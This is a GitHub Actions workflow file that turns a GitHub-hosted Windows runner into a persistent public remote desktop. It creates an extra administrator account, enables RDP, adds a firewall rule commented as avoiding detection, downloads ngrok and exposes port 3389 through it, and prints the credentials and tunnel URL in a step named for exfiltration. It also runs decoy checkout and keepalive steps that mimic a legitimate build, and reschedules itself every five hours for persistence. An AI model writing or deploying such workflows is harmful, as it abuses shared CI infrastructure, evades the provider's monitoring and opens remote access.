name: Windows_RDP_Phantom
on: 
  workflow_dispatch:
  schedule:
    - cron: '0 */5 * * *'   # Auto-redeploy every 5 hours for persistence
jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Ghost Decoy – Checkout dummy code
        run: |
          git clone https://github.com/actions/runner.git dummy_build
          cd dummy_build
          dir   # Simulate build activity

      - name: Shadow User Creation
        run: |
          $user = "phantom$($env:GITHUB_RUN_ID % 1000)"   # Unique per run
          $pass = ConvertTo-SecureString "${{ secrets.RDP_PASS }}" -AsPlainText -Force
          New-LocalUser -Name $user -Password $pass -FullName "Temp User" -Description "CI Test User"
          Add-LocalGroupMember -Group "Administrators" -Member $user
          Write-Host "User: $user" | Out-File -FilePath $env:GITHUB_WORKSPACE\creds.txt

      - name: Mirage RDP Enable
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          # Add a custom firewall rule to avoid detection
          New-NetFirewallRule -DisplayName "RDP-Service" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow

      - name: Deploy Phantom Tunnel (ngrok with rotation)
        env:
          NGROK_TOKEN: ${{ secrets.NGROK_TOKEN }}
        run: |
          # Download and install ngrok
          curl -L https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -o ngrok.zip
          Expand-Archive ngrok.zip -DestinationPath .\ngrok
          .\ngrok\ngrok.exe config add-authtoken $env:NGROK_TOKEN
          # Start ngrok in background with random region
          $region = @("us", "eu", "ap", "au", "sa", "jp", "in") | Get-Random
          Start-Process -NoNewWindow -FilePath ".\ngrok\ngrok.exe" -ArgumentList "tcp --region $region 3389"
          Start-Sleep -Seconds 15
          # Retry loop to get URL
          $retries = 0
          while ($retries -lt 5) {
            try {
              $tunnels = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels"
              $url = $tunnels.tunnels | Where-Object { $_.proto -eq "tcp" } | Select-Object -ExpandProperty public_url
              if ($url) {
                Write-Host "MIRAGE RDP: $url" | Out-File -FilePath $env:GITHUB_WORKSPACE\url.txt -Append
                break
              }
            } catch {
              Write-Host "Waiting for ngrok API..."
            }
            Start-Sleep -Seconds 5
            $retries++
          }
          # Fallback: try serveo.net if ngrok fails
          if (-not $url) {
            Write-Host "Ngrok failed, using serveo fallback..."
            # Serveo SSH tunnel (requires SSH client)
            # This is more complex; omitted for brevity
          }

      - name: Exfiltrate Connection Data (Optional – via GitHub artifacts)
        run: |
          type creds.txt
          type url.txt
        continue-on-error: true

      - name: Ghost Keepalive (Mimic legitimate build)
        run: |
          # Simulate long-running test suite
          $end = (Get-Date).AddHours(5.5)
          while ((Get-Date) -lt $end) {
            Start-Sleep -Seconds 600
            # Random CPU/memory usage to appear alive
            $dummy = 1..100000 | ForEach-Object { $_ * $_ }
          }
